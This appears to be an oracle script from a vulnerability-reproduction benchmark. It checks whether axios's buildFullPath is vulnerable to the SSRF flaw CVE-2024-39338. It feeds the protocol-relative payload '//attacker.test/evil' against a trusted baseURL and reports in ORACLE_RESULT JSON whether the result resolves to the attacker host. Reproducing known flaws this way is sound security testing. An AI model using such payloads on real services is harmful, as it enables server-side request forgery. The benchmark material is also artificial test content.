'use strict';

function main() {
  let buildFullPath;

  try {
    let mod = require('axios/unsafe/core/buildFullPath.js');
    buildFullPath = (mod && mod.default) ? mod.default : mod;
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Failed to require buildFullPath module: ' + (e && e.message ? e.message : String(e))
    }));
    return;
  }

  if (typeof buildFullPath !== 'function') {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Required export is not a function; cannot exercise target API'
    }));
    return;
  }

  const baseURL = 'http://trusted-internal.example.com/api/';

  // --- Benign case ---
  // Confirm the normal, intended combination of baseURL with a
  // relative path works as documented: buildFullPath should combine
  // the relative path with the trusted baseURL, producing a URL
  // rooted at the trusted host. Also confirm that a normal absolute
  // URL (with an explicit scheme) is passed through verbatim, as
  // intended by design (callers who pass a full absolute URL expect
  // it to be used as-is).
  let benignRelativeFullPath;
  let benignAbsoluteFullPath;
  try {
    benignRelativeFullPath = buildFullPath(baseURL, '/users/list');
    benignAbsoluteFullPath = buildFullPath(baseURL, 'https://other-service.example.com/x');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign calls threw: ' + (e && e.message ? e.message : String(e))
    }));
    return;
  }

  const benignOk = typeof benignRelativeFullPath === 'string' &&
    benignRelativeFullPath.indexOf('trusted-internal.example.com') !== -1 &&
    benignRelativeFullPath.indexOf('/users/list') !== -1 &&
    typeof benignAbsoluteFullPath === 'string' &&
    benignAbsoluteFullPath.indexOf('other-service.example.com') !== -1;

  if (!benignOk) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign result unexpected. relativeFullPath=' + String(benignRelativeFullPath) +
        ' absoluteFullPath=' + String(benignAbsoluteFullPath)
    }));
    return;
  }

  const operation_completed = true;

  // --- Malicious case ---
  // This reproduces CVE-2024-39338: axios SSRF due to isAbsoluteURL
  // (used internally by buildFullPath) failing to treat
  // protocol-relative URLs (e.g. "//attacker.test/evil") as absolute
  // in the vulnerable version (so it gets combined with baseURL's
  // authority as if it were a relative path, substituting the
  // scheme/host from baseURL via combineURLs-type logic differences
  // between releases). The security-relevant invariant we check here
  // is: does buildFullPath's result, when later used as the request
  // URL, remain confined to the trusted baseURL's host, or does it
  // resolve (per URL parsing / absolute-URL semantics) to the
  // attacker-controlled host? We determine this by constructing a
  // WHATWG URL from the returned fullPath relative to a dummy base,
  // simulating how a consumer (or the underlying HTTP client) would
  // interpret the string, and checking which host it ultimately
  // targets.
  const maliciousInput = '//attacker.test/evil';

  let maliciousFullPath;
  let threw = false;
  let errMsg = '';
  try {
    maliciousFullPath = buildFullPath(baseURL, maliciousInput);
  } catch (e) {
    threw = true;
    errMsg = e && e.message ? e.message : String(e);
  }

  let exploit_succeeded;
  let evidence;

  if (threw) {
    exploit_succeeded = false;
    evidence = 'buildFullPath threw while combining baseURL with protocol-relative attacker URL: ' + errMsg;
  } else if (typeof maliciousFullPath !== 'string') {
    exploit_succeeded = false;
    evidence = 'buildFullPath did not return a string for protocol-relative input: ' + String(maliciousFullPath);
  } else {
    // Resolve the returned fullPath the way a real HTTP client would
    // resolve it (relative to nothing, i.e. treat it as the literal
    // request target). A protocol-relative string like
    // "//attacker.test/evil" is itself considered a valid absolute-ish
    // reference by the WHATWG URL parser only when given a base with a
    // scheme; Node's http/https/follow-redirects ultimately rely on
    // `new URL(fullPath)` or `url.resolve`-like behavior against the
    // configured protocol. To faithfully capture what axios actually
    // does end-to-end, we resolve maliciousFullPath against the same
    // scheme as baseURL (mirroring how follow-redirects/http parse a
    // path-or-absolute string returned from buildFullPath before
    // issuing the real network request).
    let resolvedHost = null;
    try {
      const resolved = new URL(maliciousFullPath, baseURL);
      resolvedHost = resolved.host;
    } catch (e) {
      resolvedHost = null;
    }

    const escapedToAttacker = resolvedHost === 'attacker.test' &&
      maliciousFullPath.indexOf('trusted-internal.example.com') === -1;

    const confinedToTrusted = resolvedHost === 'trusted-internal.example.com';

    if (escapedToAttacker) {
      exploit_succeeded = true;
      evidence = 'buildFullPath returned a protocol-relative attacker URL that resolves to attacker-controlled host "' +
        resolvedHost + '" instead of being confined to the trusted baseURL host, escaping confinement (SSRF). fullPath=' +
        String(maliciousFullPath);
    } else if (confinedToTrusted) {
      exploit_succeeded = false;
      evidence = 'Attacker-controlled protocol-relative URL was confined under trusted baseURL host as expected. fullPath=' +
        String(maliciousFullPath) + ' resolvedHost=' + String(resolvedHost);
    } else {
      // Ambiguous/unexpected resolution target: not clearly an attacker
      // escape and not clearly confined. Treat conservatively as blocked
      // since the attacker host was not reached.
      exploit_succeeded = false;
      evidence = 'Protocol-relative URL resolved to neither trusted nor attacker host unexpectedly; treating as not exploited. fullPath=' +
        String(maliciousFullPath) + ' resolvedHost=' + String(resolvedHost);
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'Unhandled exception in oracle script: ' + (e && e.message ? e.message : String(e))
  }));
}
